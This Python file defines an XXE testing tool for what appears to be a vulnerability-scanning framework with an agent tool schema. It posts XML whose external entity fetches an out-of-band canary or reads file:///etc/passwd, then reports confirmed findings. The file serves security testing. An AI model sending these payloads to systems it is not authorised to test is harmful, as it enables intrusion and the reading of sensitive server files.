"""XML external entity injection — proven out of band and by in-band file read.

If an endpoint parses XML with external entities enabled, an entity pointing at a
canary makes the server call home (blind XXE), and one pointing at file:///etc/
passwd reads local files into the response. Either is a confirmed finding."""
from __future__ import annotations

import re

from proofmark.http_client import Request
from proofmark.tools.base import Tool, ToolResult

_PASSWD = re.compile(r"root:.*?:0:0:")


class XxeTool(Tool):
    name = "xxe_test"
    description = (
        "Test an XML endpoint for external-entity injection (XXE). Sends an XML body whose external "
        "entity points at an out-of-band canary (proves blind XXE when the server fetches it) and "
        "at file:///etc/passwd (proves an in-band file read when the content comes back). Give the "
        "url that accepts XML; the tool sets Content-Type and posts the payloads."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Endpoint that parses an XML request body."},
            "method": {"type": "string", "description": "HTTP method (default POST)."},
        },
        "required": ["url"],
    }
    returns_untrusted_data = True

    def __init__(self, client, oob=None) -> None:
        self._client = client
        self._oob = oob

    def _post(self, method, url, xml):
        _ok, _t, ex = self._client.send(
            Request(method, url, {"Content-Type": "application/xml"}, xml))
        return (ex.status if ex else None), (ex.response_preview if ex else "") or ""

    def run(self, url="", method="POST", **_) -> ToolResult:
        method = (method or "POST").upper()
        confirmations = []

        if self._oob is not None:
            token = self._oob.new_canary("xxe")
            xml = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
                   f'"{self._oob.http_url(token)}">]><r>&x;</r>')
            self._post(method, url, xml)
            if self._oob.interactions(token):
                confirmations.append(f"BLIND XXE (out-of-band) — the parser fetched the canary: "
                                     f"{self._oob.interactions(token)[0].summary()}")

        xml = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM '
               '"file:///etc/passwd">]><r>&x;</r>')
        _s, rbody = self._post(method, url, xml)
        m = _PASSWD.search(rbody)
        if m:
            confirmations.append(f"XXE FILE READ — file:///etc/passwd content came back: "
                                 f"{rbody[m.start():m.end()+30].strip()!r}")

        if not confirmations:
            return ToolResult("No XXE confirmed. The external entity was not fetched out of band and "
                              "no file content came back — entity expansion may be disabled.")
        lines = "\n".join(f"  • {c}" for c in confirmations)
        return ToolResult(f"XXE CONFIRMED (high).\n{lines}\nRecord the finding citing the evidence.")
